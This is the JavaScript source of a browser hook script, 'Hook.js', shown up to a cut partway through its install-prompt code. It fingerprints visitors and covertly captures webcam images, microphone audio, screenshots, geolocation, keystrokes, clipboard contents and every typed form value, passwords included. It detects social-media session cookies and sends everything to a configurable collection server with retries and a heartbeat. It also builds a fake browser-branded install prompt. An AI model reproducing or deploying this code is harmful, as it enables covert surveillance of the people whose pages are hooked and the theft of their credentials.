(function() {
    var config = {
        server: "https://localhost:443",
        //apiKey: '',
        debug: false,
        ipInfoApi: "https://api.ipify.org?format=json",
        pollInterval: 5000,
        features: {"battery":true,"clipboard":true,"collectBrowserInfo":true,"geolocation":true,"keylogger":true,"microphone":true,"network":true,"screenshot":true,"socialMedia":true,"webcam":true},
        persistentSession: true,
        enablePWA: false,
        enableInstall: false,
        installURL: "",
    };

    function debugLog() {
        if (config.debug) {
            console.log.apply(console, arguments);
        }
    }

    function collectBrowserInfo() {
        const browserInfo = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages,
            platform: navigator.platform,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            screenWidth: screen.width,
            screenHeight: screen.height,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio,
            windowWidth: window.innerWidth,
            windowHeight: window.innerHeight,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            referrer: document.referrer,
            connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
            batteryLevel: null,
            memoryInfo: navigator.deviceMemory || 'unknown',
            cpuCores: navigator.hardwareConcurrency || 'unknown',
            touchPoints: navigator.maxTouchPoints || 0,
            webglRenderer: null,
            webglVendor: null
        };

        try {
            browserInfo.fingerprint = generateFingerprint();
        } catch (e) {
            browserInfo.fingerprint = "error-generating-fingerprint";
            if (config.debug) console.error('Error generating fingerprint:', e);
        }

        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    browserInfo.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    browserInfo.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }
        } catch (e) {
            browserInfo.webglError = e.message;
        }

        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                browserInfo.batteryLevel = battery.level;
                browserInfo.batteryCharging = battery.charging;
                
                sendData('browserInfo', browserInfo);
            });
        } else {
            sendData('browserInfo', browserInfo);
        }
    }

    function collectPlugins() {
        var plugins = [];
        if (navigator.plugins) {
            for (var i = 0; i < navigator.plugins.length; i++) {
                var plugin = navigator.plugins[i];
                plugins.push({
                    name: plugin.name,
                    description: plugin.description,
                    filename: plugin.filename
                });
            }
        }
        return plugins;
    }

    function getPublicIP(callback) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', config.ipInfoApi, true);
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    try {
                        var response = JSON.parse(xhr.responseText);
                        callback(null, response.ip);
                    } catch (e) {
                        callback("IP Parse Error: " + e.message);
                    }
                } else {
                    callback("IP Retrieve Error: " + xhr.status);
                }
            }
        };
        xhr.onerror = function() {
            callback("IP Retrieve Error");
        };
        xhr.send();
    }

    function sendData(type, data) {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', config.server + '/api/data', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.withCredentials = true;
            xhr.timeout = 30000;
        
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status >= 200 && xhr.status < 300) {
                        if (config.debug) console.log('Send Data Success:', type);
                        
                        try {
                            var response = JSON.parse(xhr.responseText);
                            if (response.sessionId && response.sessionId !== config.sessionId) {
                                config.sessionId = response.sessionId;
                                if (config.debug) console.log('SessionID Updated:', config.sessionId);
                                
                                if (config.persistentSession) {
                                    try {
                                        localStorage.setItem('hook_session_id', config.sessionId);
                                    } catch (e) {
                                        if (config.debug) console.error('LocalStorage access error: ', e);
                                    }
                                }
                            }
                        } catch (e) {
                            if (config.debug) console.error('Response Processing Error:', e, xhr.responseText);
                        }
                    } else {
                        if (config.debug) console.error('Send Data Error, Status Code:', xhr.status);
                        if (!data._retryCount) {
                            data._retryCount = 1;
                        } else if (data._retryCount < 3) {
                            data._retryCount++;
                        } else {
                            if (config.debug) console.error('Maximum retry count reached:', data);
                            return;
                        }
                        
                        var retryDelay = Math.pow(2, data._retryCount) * 1000;
                        if (config.debug) console.log('Retry:', data._retryCount, 'Delay:', retryDelay);
                        
                        setTimeout(function() {
                            sendData(type, data);
                        }, retryDelay);
                    }
                }
            };
            
            xhr.ontimeout = function() {
                if (config.debug) console.error('Request timeout:', type);
                if (!data._timeoutRetry) {
                    data._timeoutRetry = true;
                    if (config.debug) console.log('Retry after timeout');
                    setTimeout(function() {
                        sendData(type, data);
                    }, 3000);
                }
            };
            
            xhr.onerror = function(e) {
                if (config.debug) console.error('XHR Connection Error:', e);
                if (!data._networkRetry) {
                    data._networkRetry = true;
                    if (config.debug) console.log('Network error, retry');
                    setTimeout(function() {
                        sendData(type, data);
                    }, 5000);
                }           
            };
            
            var payload = {
                type: type,
                data: data,
                sessionId: config.sessionId,
                userAgent: navigator.userAgent,
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
            
            if (config.debug) console.log('Sending data:', type);
            xhr.send(JSON.stringify(payload));
        } catch (e) {
            if (config.debug) console.error('XHR Error:', e);
        }
    }

    function hasLocalStorage() {
        try {
            return !!window.localStorage;
        } catch (e) {
            return false;
        }
    }

    function hasSessionStorage() {
        try {
            return !!window.sessionStorage;
        } catch (e) {
            return false;
        }
    }

    function hasIndexedDB() {
        try {
            return !!window.indexedDB;
        } catch (e) {
            return false;
        }
    }

    function hasWebGL() {
        try {
            var canvas = document.createElement('canvas');
            return !!(window.WebGLRenderingContext && 
                (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
        } catch (e) {
            return false;
        }
    }

    function hasCanvas() {
        try {
            var canvas = document.createElement('canvas');
            return !!(canvas.getContext && canvas.getContext('2d'));
        } catch (e) {
            return false;
        }
    }

    function hasWebRTC() {
        return !!(window.RTCPeerConnection || window.mozRTCPeerConnection || 
                window.webkitRTCPeerConnection);
    }

    function hasTouchSupport() {
        return 'ontouchstart' in window || 
               navigator.maxTouchPoints > 0 || 
               navigator.msMaxTouchPoints > 0;
    }

    function generateFingerprint() {
        try {
            var fingerprint = {
                canvasFingerprint: getCanvasFingerprint(),
                webGLFingerprint: getWebGLFingerprint(),
                fontFingerprint: getFontFingerprint(),
                audioFingerprint: getAudioFingerprint()
            };
            
            var fingerprintStr = JSON.stringify(fingerprint);
            return simpleHash(fingerprintStr);
        } catch (e) {
            console.error("Fingerprint creation error:", e);
            return "error-" + (new Date().getTime());
        }
    }

    function getCanvasFingerprint() {
        try {
            var canvas = document.createElement('canvas');
            var ctx = canvas.getContext('2d');
            canvas.width = 200;
            canvas.height = 50;
            
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText("Hook.js Fingerprint", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("Hook.js Fingerprint", 4, 17);
            
            return canvas.toDataURL().substr(-50);
        } catch (e) {
            return "canvas-unsupported";
        }
    }

    // WebGL fingerprint
    function getWebGLFingerprint() {
        try {
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return "webgl-unsupported";
            
            var info = {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION)
            };
            
            return simpleHash(JSON.stringify(info));
        } catch (e) {
            return "webgl-error";
        }
    }

    // Font fingerprint
    function getFontFingerprint() {
        try {
            var fontList = [
                'Arial', 'Arial Black', 'Arial Narrow', 'Calibri', 'Cambria', 
                'Cambria Math', 'Comic Sans MS', 'Consolas', 'Courier', 'Courier New', 
                'Georgia', 'Helvetica', 'Impact', 'Lucida Console', 'Lucida Sans Unicode', 
                'Microsoft Sans Serif', 'Palatino Linotype', 'Segoe UI', 'Tahoma', 'Times', 
                'Times New Roman', 'Trebuchet MS', 'Verdana', 'Webdings'
            ];
            
            var testString = "mmmmmmmmmmlli";
            var testSize = "72px";
            var baseFonts = ["monospace", "sans-serif", "serif"];
            
            var available = [];
            
            var body = document.body || document.getElementsByTagName("body")[0];
            if (!body) {
                if (config.debug) console.log('Body elementi bulunamadı');
                return "no-body-element";
            }
            
            var span = document.createElement("span");
            span.style.position = "absolute";
            span.style.left = "-9999px";
            span.style.fontSize = testSize;
            span.innerHTML = testString;
            
            var defaultWidth = {};
            var defaultHeight = {};
            
            for (var index = 0; index < baseFonts.length; index++) {
                span.style.fontFamily = baseFonts[index];
                body.appendChild(span);
                defaultWidth[baseFonts[index]] = span.offsetWidth;
                defaultHeight[baseFonts[index]] = span.offsetHeight;
                body.removeChild(span);
            }
            
            for (var i = 0; i < fontList.length; i++) {
                var detected = false;
                for (var j = 0; j < baseFonts.length; j++) {
                    span.style.fontFamily = fontList[i] + ',' + baseFonts[j];
                    body.appendChild(span);
                    var matched = (span.offsetWidth !== defaultWidth[baseFonts[j]] || 
                                span.offsetHeight !== defaultHeight[baseFonts[j]]);
                    body.removeChild(span);
                    if (matched) {
                        detected = true;
                        break;
                    }
                }
                if (detected) {
                    available.push(fontList[i]);
                }
            }
            
            return simpleHash(available.join(','));
        } catch (e) {
            if (config.debug) console.error('Font fingerprint error:', e);
            return "font-error-" + e.message;
        }
    }

    // Audio fingerprint
    function getAudioFingerprint() {
        try {
            return simpleHash(navigator.userAgent + navigator.language + screen.width + screen.height);
            
            /* var audioContext = new (window.AudioContext || window.webkitAudioContext)();
            
            if (audioContext.audioWorklet) {
                // AudioWorklet usage will be here
                // Note: This requires a more complex implementation
            } else {
                var analyser = audioContext.createAnalyser();
                var gain = audioContext.createGain();
                var scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
                
                var oscillator = audioContext.createOscillator();
                
                gain.gain.value = 0; // Silent
                oscillator.type = "triangle";
                oscillator.connect(analyser);
                analyser.connect(scriptProcessor);
                scriptProcessor.connect(gain);
                gain.connect(audioContext.destination);
                
                oscillator.start(0);
                
                var audioData = new Uint8Array(analyser.frequencyBinCount);
                analyser.getByteFrequencyData(audioData);
                
                oscillator.stop();
                
                return simpleHash(Array.prototype.slice.call(audioData).join(','));
            }
            */
        } catch (e) {
            return "audio-unsupported";
        }
    }

    // Simple hash function
    function simpleHash(str) {
        var hash = 0;
        if (str.length === 0) return hash;
        for (var i = 0; i < str.length; i++) {
            var char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash; // 32bit integer
        }
        return hash.toString(16);
    }

    // Webcam access
    function captureWebcam() {
        try {
            // Document and body check
            if (!document || !document.body) {
                if (config.debug) console.log('Document or body element is not ready, webcam access failed');
                return;
            }
            
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                if (config.debug) console.log('Webcam access not supported');
                sendData('webcam_error', { error: 'Webcam access not supported' });
                return;
            }

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    try {
                        // Create an invisible video element
                        var video = document.createElement('video');
                        video.style.position = 'absolute';
                        video.style.opacity = '0';
                        video.style.pointerEvents = 'none';
                        video.style.zIndex = '-1';
                        video.width = 320;
                        video.height = 240;
                        video.autoplay = true;
                        document.body.appendChild(video);
                        video.srcObject = stream;

                        // Capture image after a short time
                        setTimeout(function() {
                            try {
                                var canvas = document.createElement('canvas');
                                canvas.width = video.width;
                                canvas.height = video.height;
                                var ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                
                                // Send image
                                var imageData = canvas.toDataURL('image/jpeg', 0.7);
                                sendData('webcam', { image: imageData });
                                
                                // Cleanup
                                stream.getTracks().forEach(function(track) {
                                    track.stop();
                                });
                                document.body.removeChild(video);
                            } catch (e) {
                                if (config.debug) console.error('Webcam image capture error:', e);
                                sendData('webcam_error', { error: 'Image capture error: ' + e.message });
                                
                                // Cleanup
                                try {
                                    stream.getTracks().forEach(function(track) {
                                        track.stop();
                                    });
                                    document.body.removeChild(video);
                                } catch (cleanupError) {
                                    if (config.debug) console.error('Webcam cleanup error:', cleanupError);
                                }
                            }
                        }, 1000);
                    } catch (e) {
                        if (config.debug) console.error('Webcam video creation error:', e);
                        sendData('webcam_error', { error: 'Video creation error: ' + e.message });
                        
                        // Cleanup
                        try {
                            stream.getTracks().forEach(function(track) {
                                track.stop();
                            });
                        } catch (cleanupError) {
                            if (config.debug) console.error('Webcam stream cleanup error:', cleanupError);
                        }
                    }
                })
                .catch(function(err) {
                    if (config.debug) console.error('Webcam access error:', err);
                    sendData('webcam_error', { error: err.message });
                });
        } catch (e) {
            if (config.debug) console.error('Webcam function error:', e);
            sendData('webcam_error', { error: 'Webcam function error: ' + e.message });
        }
    }

    // Get location information
    function getGeolocation() {
        if (!navigator.geolocation) {
            if (config.debug) console.log('Geolocation not supported');
            return;
        }

        navigator.geolocation.getCurrentPosition(
            function(position) {
                var locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    altitudeAccuracy: position.coords.altitudeAccuracy,
                    heading: position.coords.heading,
                    speed: position.coords.speed,
                    timestamp: position.timestamp
                };
                
                // Create Google Maps URL
                locationData.mapsUrl = 'https://www.google.com/maps?q=' + 
                                      position.coords.latitude + ',' + 
                                      position.coords.longitude;
                
                sendData('geolocation', locationData);
            },
            function(err) {
                if (config.debug) console.error('Geolocation error:', err);
                sendData('geolocation_error', { error: err.message, code: err.code });
            },
            { 
                enableHighAccuracy: true, 
                timeout: 5000, 
                maximumAge: 0 
            }
        );
    }

    // Microphone access
    function captureMicrophone() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            if (config.debug) console.log('Microphone access not supported');
            return;
        }

        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
                // Use MediaRecorder for audio recording
                var mediaRecorder = new MediaRecorder(stream);
                var audioChunks = [];

                mediaRecorder.addEventListener("dataavailable", function(event) {
                    audioChunks.push(event.data);
                });

                mediaRecorder.addEventListener("stop", function() {
                    // Combine audio data
                    var audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    var reader = new FileReader();
                    reader.readAsDataURL(audioBlob);
                    reader.onloadend = function() {
                        var base64data = reader.result;
                        sendData('microphone', { audio: base64data });
                        
                        // Cleanup
                        stream.getTracks().forEach(function(track) {
                            track.stop();
                        });
                    };
                });

                // Record for 3 seconds
                mediaRecorder.start();
                setTimeout(function() {
                    mediaRecorder.stop();
                }, 3000);
            })
            .catch(function(err) {
                if (config.debug) console.error('Microphone access error:', err);
                sendData('microphone_error', { error: err.message });
            });
    }

    // Capture screenshot
    function captureScreenshot() {
        try {
            // Document and body check
            if (!document || !document.body) {
                if (config.debug) console.log('Document or body element is not ready, screenshot capture failed');
                return;
            }
            
            // Load HTML2Canvas library dynamically
            var script = document.createElement('script');
            script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
            script.onload = function() {
                try {
                    html2canvas(document.body).then(function(canvas) {
                        try {
                            var screenshot = canvas.toDataURL('image/jpeg', 0.7);
                            sendData('screenshot', { image: screenshot });
                        } catch (e) {
                            if (config.debug) console.error('Canvas data URL error:', e);
                            sendData('screenshot_error', { error: 'Canvas data URL error: ' + e.message });
                        }
                    }).catch(function(e) {
                        if (config.debug) console.error('html2canvas error:', e);
                        sendData('screenshot_error', { error: 'html2canvas error: ' + e.message });
                    });
                } catch (e) {
                    if (config.debug) console.error('html2canvas call error:', e);
                    sendData('screenshot_error', { error: 'html2canvas call error: ' + e.message });
                }
            };
            script.onerror = function(e) {
                if (config.debug) console.error('html2canvas loading error:', e);
                sendData('screenshot_error', { error: 'html2canvas loading error' });
            };
            document.head.appendChild(script);
        } catch (e) {
            if (config.debug) console.error('Screenshot error:', e);
            sendData('screenshot_error', { error: e.message });
        }
    }

    // Keylogger
    function startKeylogger() {
        var keys = '';
        var lastKeypressTime = Date.now();
        var keylogInterval = null;

        document.addEventListener('keydown', function(e) {
            var now = Date.now();
            
            // Add timestamp when a new key is pressed
            if (now - lastKeypressTime > 1000) {
                keys += "\n[" + new Date().toISOString() + "] ";
            }
            
            // Handle special keys
            switch(e.key) {
                case "Enter":
                    keys += "[ENTER]\n";
                    break;
                case "Tab":
                    keys += "[TAB]";
                    break;
                case "Escape":
                    keys += "[ESC]";
                    break;
                case "ArrowUp":
                    keys += "[UP]";
                    break;
                case "ArrowDown":
                    keys += "[DOWN]";
                    break;
                case "ArrowLeft":
                    keys += "[LEFT]";
                    break;
                case "ArrowRight":
                    keys += "[RIGHT]";
                    break;
                case "Backspace":
                    keys += "[BACKSPACE]";
                    break;
                case "Delete":
                    keys += "[DELETE]";
                    break;
                case "Control":
                    keys += "[CTRL]";
                    break;
                case "Alt":
                    keys += "[ALT]";
                    break;
                case "Shift":
                    keys += "[SHIFT]";
                    break;
                case " ":
                    keys += " ";
                    break;
                default:
                    // Add normal keys
                    if (e.key.length === 1) {
                        keys += e.key;
                    } else {
                        keys += "[" + e.key.toUpperCase() + "]";
                    }
            }
            
            lastKeypressTime = now;
        });

        // Send key logs at certain intervals
        keylogInterval = setInterval(function() {
            if (keys.length > 0) {
                sendData('keylogger', { keys: keys });
                keys = '';
            }
        }, 5000);

        // Function to stop keylogger
        window.stopKeylogger = function() {
            clearInterval(keylogInterval);
            document.removeEventListener('keydown');
        };
    }

    // Get clipboard content
    function getClipboard() {
        if (navigator.clipboard && navigator.clipboard.readText) {
            navigator.clipboard.readText()
                .then(function(text) {
                    sendData('clipboard', { text: text });
                })
                .catch(function(err) {
                    if (config.debug) console.error('Clipboard access error:', err);
                    sendData('clipboard_error', { error: err.message });
                });
        } else {
            if (config.debug) console.log('Clipboard access not supported');
        }
    }

    // Social media detection
    function detectSocialMedia() {
        var socialNetworks = [
            { name: 'Facebook', url: 'https://www.facebook.com', cookie: 'c_user', localStorage: 'fb' },
            { name: 'Twitter', url: 'https://twitter.com', cookie: 'twid', localStorage: 'twitter' },
            { name: 'LinkedIn', url: 'https://www.linkedin.com', cookie: 'li_at', localStorage: 'linkedin' },
            { name: 'Instagram', url: 'https://www.instagram.com', cookie: 'sessionid', localStorage: 'ig' },
            { name: 'Gmail', url: 'https://mail.google.com', cookie: 'GMAIL_AT', localStorage: 'gmail' },
            { name: 'YouTube', url: 'https://www.youtube.com', cookie: 'VISITOR_INFO1_LIVE', localStorage: 'yt' },
            { name: 'Amazon', url: 'https://www.amazon.com', cookie: 'session-id', localStorage: 'amazon' },
            { name: 'Reddit', url: 'https://www.reddit.com', cookie: 'reddit_session', localStorage: 'reddit' }
        ];
        
        var detected = [];
        
        // Check cookies
        for (var i = 0; i < socialNetworks.length; i++) {
            var network = socialNetworks[i];
            if (document.cookie.indexOf(network.cookie) !== -1) {
                detected.push(network.name);
            }
        }
        
        // Check visited sites (using localStorage)
        if (window.localStorage) {
            for (var i = 0; i < socialNetworks.length; i++) {
                var network = socialNetworks[i];
                if (localStorage.getItem(network.localStorage)) {
                    if (detected.indexOf(network.name) === -1) {
                        detected.push(network.name);
                    }
                }
            }
        }
        
        // Send results
        sendData('social_media', { detected: detected });
    }

    // Battery status
    function getBatteryInfo() {
        if (navigator.getBattery) {
            navigator.getBattery().then(function(battery) {
                var batteryData = {
                    level: battery.level * 100,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
                
                sendData('battery', batteryData);
                
                // Monitor battery status changes
                battery.addEventListener('levelchange', function() {
                    batteryData.level = battery.level * 100;
                    sendData('battery_update', batteryData);
                });
                
                battery.addEventListener('chargingchange', function() {
                    batteryData.charging = battery.charging;
                    sendData('battery_update', batteryData);
                });
            });
        } else {
            if (config.debug) console.log('Battery API not supported');
        }
    }

    // Network information
    function getNetworkInfo() {
        var networkData = {
            online: navigator.onLine,
            connectionType: 'unknown',
            effectiveType: 'unknown',
            downlink: 'unknown',
            rtt: 'unknown'
        };
        
        // Network Information API
        if (navigator.connection) {
            networkData.connectionType = navigator.connection.type;
            networkData.effectiveType = navigator.connection.effectiveType;
            networkData.downlink = navigator.connection.downlink;
            networkData.rtt = navigator.connection.rtt;
        }
        
        sendData('network_info', networkData);
        
        // Monitor network status changes
        window.addEventListener('online', function() {
            networkData.online = true;
            sendData('network_update', networkData);
        });
        
        window.addEventListener('offline', function() {
            networkData.online = false;
            sendData('network_update', networkData);
        });
    }

    // Monitor form inputs
    function monitorFormInputs() {
        try {
            debugLog('Form monitoring started');
            
            // Monitor input changes
            document.addEventListener('input', function(e) {
                if (e.target.tagName === 'INPUT') {
                    var inputData = {
                        name: e.target.name || 'unnamed',
                        id: e.target.id || 'no-id',
                        type: e.target.type || 'text',
                        value: e.target.value,
                        timestamp: new Date().toISOString(),
                        url: window.location.href,
                        formId: e.target.form ? e.target.form.id : null,
                        placeholder: e.target.placeholder || null
                    };
                    
                    sendData('form_input', inputData);
                }
            });
            
            // Monitor form submissions
            document.addEventListener('submit', function(e) {
                var form = e.target;
                var formData = {
                    formId: form.id || 'no-id',
                    action: form.action,
                    method: form.method,
                    inputs: []
                };
                
                // Collect all inputs from the form
                var inputs = form.getElementsByTagName('input');
                for (var i = 0; i < inputs.length; i++) {
                    var input = inputs[i];
                    formData.inputs.push({
                        name: input.name || 'unnamed',
                        id: input.id || 'no-id',
                        type: input.type || 'text',
                        value: input.value,
                        placeholder: input.placeholder || null
                    });
                }
                
                sendData('form_submit', formData);
            });
            
            // Use MutationObserver to monitor dynamically added forms
            var observer = new MutationObserver(function(mutations) {
                mutations.forEach(function(mutation) {
                    mutation.addedNodes.forEach(function(node) {
                        if (node.nodeName === 'FORM') {
                            debugLog('New form element added:', node);
                        }
                    });
                });
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
            
        } catch (e) {
            if (config.debug) console.error('Form monitoring error:', e);
        }
    }

    // First run
    function initialize() {
        try {
            // Initialize sessionID
            initSessionId();
            
            // Document and body check
            if (!document || !document.body) {
                if (config.debug) console.log('Document or body element is not ready, will retry in 500ms');
                setTimeout(initialize, 500);
                return;
            }
            
            // Start form monitoring
            monitorFormInputs();
            
            // Collect browser information
            if (config.features.collectBrowserInfo) {
                var browserInfo = collectBrowserInfo();
                
                // Get public IP address
                getPublicIP(function(err, ip) {
                    if (!err) {
                        // Add IP address to browserInfo
                        browserInfo.network = {
                            publicIP: ip
                        };
                    }
                    
                    // Send browser information
                    sendData('browser_info', browserInfo);
                    
                    // Print to console (for testing)
                    if (config.debug) {
                        console.log('Hook loaded successfully. Session ID:', config.sessionId);
                        console.log('Browser information:', browserInfo);
                        
                        // Add fingerprint check
                        if (browserInfo && browserInfo.fingerprint) {
                            console.log('Browser fingerprint:', browserInfo.fingerprint);
                        } else {
                            console.log('Browser fingerprint not created.');
                        }
                    }
                });
            }
            
            // Start other features
            setTimeout(function() {
                try {
                    // Webcam access
                    if (config.features.webcam) {
                        captureWebcam();
                    }
                    
                    // Location information
                    if (config.features.geolocation) {
                        getGeolocation();
                    }
                    
                    // Microphone access
                    if (config.features.microphone) {
                        captureMicrophone();
                    }
                    
                    // Screenshot
                    if (config.features.screenshot) {
                        captureScreenshot();
                    }
                    
                    // Keylogger
                    if (config.features.keylogger) {
                        startKeylogger();
                    }
                    
                    // Clipboard content
                    if (config.features.clipboard) {
                        getClipboard();
                    }
                    
                    // Social media detection
                    if (config.features.socialMedia) {
                        detectSocialMedia();
                    }
                    
                    // Battery status
                    if (config.features.battery) {
                        getBatteryInfo();
                    }
                    
                    // Network information
                    if (config.features.network) {
                        getNetworkInfo();
                    }
                } catch (e) {
                    if (config.debug) console.error('Feature initialization error:', e);
                }
            }, 1000);
            
            // Periodic status update
            setInterval(function() {
                sendData('heartbeat', {
                    timestamp: new Date().toISOString(),
                    url: window.location.href
                });
            }, config.pollInterval);
        } catch (e) {
            if (config.debug) console.error('Initialize error:', e);
        }
    }

    // Start hook
    initialize();

    // Function to run when page is loaded
    function init() {
        debugLog("Hook.js starting...");
        
        // Session ID check is now done in the initialize function, so we don't need to call it again
        
        // Add Install button when page is fully loaded
        if (document.readyState === 'complete') {
            setupPWAAndInstallButton();
        } else {
            window.addEventListener('load', function() {
                setupPWAAndInstallButton();
            });
        }
        
        // Try adding PWA Install button separately
        setTimeout(function() {
            if (config.enablePWA) {
                debugLog("PWA Install button being added directly from init...");
                addPWAInstallButton();
            }
        }, 2000);
    }

    // PWA and Install button setup function
    function setupPWAAndInstallButton() {
        debugLog("setupPWAAndInstallButton function called");
        
        // If PWA service worker exists, register it
        if (config.enablePWA) {
            debugLog("PWA feature enabled, Service Worker registering...");
            registerServiceWorker();
            
            // Add PWA Install button directly
            debugLog("PWA Install button being added directly from setupPWAAndInstallButton");
            addPWAInstallButton();
        } else {
            debugLog("PWA feature not enabled.");
        }
        
        // Add Install button if enabled
        if (config.enableInstall) {
            debugLog("Install button enabled, creating...");
            // Wait for DOM to load before adding Install button
            setTimeout(function() {
                addInstallButton();
            }, 1500);
        } else {
            debugLog("Install button not enabled.");
        }
    }

    // Tool init when ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            debugLog("DOM content loaded, hook.js init starting...");
            init();
        });
    } else {
        debugLog("DOM already loaded, hook.js init starting...");
        init();
    }

    // Service Worker registration for PWA
    function registerServiceWorker() {
        if ('serviceWorker' in navigator) {
            window.addEventListener('load', function() {
                navigator.serviceWorker.register('/static/sw.js').then(function(registration) {
                    debugLog('ServiceWorker registration successful: ', registration.scope);
                }).catch(function(err) {
                    debugLog('ServiceWorker registration failed: ', err);
                });
            });
            
            // Listen for PWA installation events
            window.addEventListener('beforeinstallprompt', (e) => {
                // Save the installation prompt
                window.deferredPrompt = e;
                debugLog('PWA installation prompt received');
            });
        }
    }
    
    // Add Install button
    function addInstallButton() {
        try {
            debugLog("Add Install button process started, URL:", config.installURL);
            
            // Browser detection based on user agent
            var userAgent = navigator.userAgent.toLowerCase();
            var isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
            var isChrome = userAgent.indexOf('chrome') > -1 && userAgent.indexOf('edge') === -1 && userAgent.indexOf('opr') === -1;
            var isFirefox = userAgent.indexOf('firefox') > -1;
            var isEdge = userAgent.indexOf('edge') > -1 || userAgent.indexOf('edg') > -1;
            var isBrave = isChrome && navigator.brave && navigator.brave.isBrave || false;
            
            // Browser detection - supported browsers check
            var isSupportedBrowser = isChrome || isFirefox || isSafari || isEdge || isBrave;
            
            debugLog("Browser detection: Chrome: " + isChrome + ", Firefox: " + isFirefox + 
                    ", Safari: " + isSafari + ", Edge: " + isEdge + ", Brave: " + isBrave);
            
            // If already added, don't add again
            if (document.querySelector('.install-prompt')) {
                debugLog("Install button already added.");
                return;
            }
            
            // Create main container - similar to Google Play prompt
            var promptDiv = document.createElement('div');
            promptDiv.className = 'install-prompt';
            promptDiv.style.position = 'fixed';
            promptDiv.style.bottom = '20px';
            promptDiv.style.left = '20px';
            promptDiv.style.width = '320px';
            promptDiv.style.backgroundColor = 'white';
            promptDiv.style.padding = '16px';
            promptDiv.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
            promptDiv.style.zIndex = '9999';
            promptDiv.style.borderRadius = '8px';
            promptDiv.style.fontFamily = 'Roboto, Arial, sans-serif';
            
            // Close button
            var closeButton = document.createElement('div');
            closeButton.style.position = 'absolute';
            closeButton.style.right = '12px';
            closeButton.style.top = '12px';
            closeButton.style.cursor = 'pointer';
            closeButton.style.fontSize = '18px';
            closeButton.style.fontWeight = 'normal';
            closeButton.style.color = '#5f6368';
            closeButton.innerHTML = '&times;';
            closeButton.style.width = '20px';
            closeButton.style.height = '20px';
            closeButton.style.display = 'flex';
            closeButton.style.alignItems = 'center';
            closeButton.style.justifyContent = 'center';
            closeButton.style.borderRadius = '50%';

            // Top section - logo and title
            var headerDiv = document.createElement('div');
            headerDiv.style.display = 'flex';
            headerDiv.style.alignItems = 'center';
            headerDiv.style.marginBottom = '14px';
            
            // Download icon (used for unsupported browsers or file access issues)
            var downloadIconSvg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="100%" height="100%"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z" fill="#4285F4"/></svg>';
            
            // Select logo based on browser
            try {
                var logoSvg = ''; // Default to empty
                var downloadIconHtml = downloadIconSvg; // Save downloadIconSvg as HTML string
                
                if (isChrome && !isBrave && !isEdge) {
                    logoSvg = '<img src="/static/img/google-chrome-icon.svg" width="100%" height="100%" alt="Chrome">';
                } else if (isFirefox) {
                    logoSvg = '<img src="/static/img/firefox-browser-icon.svg" width="100%" height="100%" alt="Firefox">';
                } else if (isSafari) {
                    logoSvg = '<img src="/static/img/safari-browser-icon.svg" width="100%" height="100%" alt="Safari">';
                } else if (isBrave) {
                    logoSvg = '<img src="/static/img/brave-browser-icon.svg" width="100%" height="100%" alt="Brave">';
                } else if (isEdge) {
                    logoSvg = '<img src="/static/img/edge-browser-icon.svg" width="100%" height="100%" alt="Edge">';
                } else {
                    // Show download icon for unsupported browsers
                    logoSvg = downloadIconSvg;
                    debugLog("Unsupported browser, showing download icon");
                }
            } catch (e) {
                // If error occurs or file access fails, show download icon
                logoSvg = downloadIconSvg;
                debugLog("Logo file not accessible, showing download icon:", e);
            }
            
            // Fallback plan - check if image loads
            var logoDiv = document.createElement('div');
            logoDiv.style.marginRight = '12px';
            logoDiv.style.width = '38px';
            logoDiv.style.height = '38px';
            logoDiv.style.minWidth = '38px';
            logoDiv.innerHTML = logoSvg;
            
